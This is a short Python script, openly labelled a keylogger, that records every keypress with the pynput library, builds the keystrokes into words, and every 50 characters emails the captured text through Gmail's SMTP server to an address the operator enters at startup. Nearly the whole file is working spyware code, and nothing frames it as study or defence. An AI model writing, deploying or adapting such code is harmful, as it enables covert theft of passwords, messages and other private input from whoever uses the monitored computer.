import getpass
# email protocol library
import smtplib

from pynput.keyboard import Key, Listener

print("KELOGGER >:^)")

# set up email
email = input('Enter email: ')
# getpass makes passowrd invisible
password = getpass.getpass(prompt='Password ', stream=None)

# sending email w/ python boilerplate
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

# logger
full_log = ' '
word = ' '
# logger will send email every 50 characters
char_limit = 50
# on press function


def on_press(key):
    global word
    global full_log
    global email
    global char_limit

    # first need to check if key pressed is not a character in alphabet
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= char_limit:
            send_log()
            full_log = ' '

    elif key == Key.shift_l or key == Key.shift_r:  # ignores left or right shift
        return
    elif key == Key.backspace:
        word = word[:-1]  # removes last item in array(slice notation)
    else:
        char = f'{key}'
        char = char[1:-1]  # removes '' by removing first and last char of word
        word += char

    if key == Key.esc:
        return False

# send email function


def send_log():
    server.sendmail(
        email,  # to
        email,  # from
        full_log
    )


# listner boiler plate
with Listener(on_press=on_press) as listener:
    listener.join()
